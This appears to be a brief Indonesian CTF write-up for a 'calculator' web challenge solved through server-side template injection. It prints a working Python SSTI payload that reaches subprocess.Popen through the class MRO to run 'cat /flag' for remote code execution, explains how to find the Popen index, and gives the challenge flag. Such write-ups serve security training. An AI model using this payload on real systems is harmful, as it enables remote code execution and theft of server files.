## Judul Soal
kalkulator

## Deskripsi Soal

ya cuma kalkulator

---
## Proof of Concept
- Server side template injection
- kita bisa menggunakan payload untuk melakukan RCE
- Referensi: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- `''.__class__.__mro__[1].__subclasses__()[414](['cat /flag'], shell=True, stdout=-1).communicate()`
- Untuk array index 414, kita perlu mencari class Popen terlebih dahulu ada di index nomor berapa

## Flag
tangerangkota{kalkulator_adalah_alat_heker_terbaik}